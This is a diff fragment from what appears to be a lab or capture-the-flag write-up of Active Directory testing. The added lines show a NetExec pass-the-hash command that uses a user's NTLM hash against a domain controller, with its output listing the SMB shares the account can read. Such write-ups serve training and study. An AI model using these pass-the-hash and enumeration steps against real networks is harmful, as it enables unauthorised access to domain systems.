@@ -583,3 +583,16 @@ SMB         10.0.22.198     445    DC01             [+] hsm.local\bbarkinson:53c
 ```
 This user has access on the domain controller
 
+```python
+nxc smb DC01.hsm.local -u bbarkinson -H '53c3709ae3d9f4428a230db81361ffbc' --shares                    
+SMB         10.0.22.198     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:hsm.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.22.198     445    DC01             [+] hsm.local\bbarkinson:53c3709ae3d9f4428a230db81361ffbc 
+SMB         10.0.22.198     445    DC01             [*] Enumerated shares
+SMB         10.0.22.198     445    DC01             Share           Permissions     Remark
+SMB         10.0.22.198     445    DC01             -----           -----------     ------
+SMB         10.0.22.198     445    DC01             ADMIN$                          Remote Admin
+SMB         10.0.22.198     445    DC01             C$                              Default share
+SMB         10.0.22.198     445    DC01             IPC$            READ            Remote IPC
+SMB         10.0.22.198     445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.0.22.198     445    DC01             SYSVOL          READ            Logon server share
+```
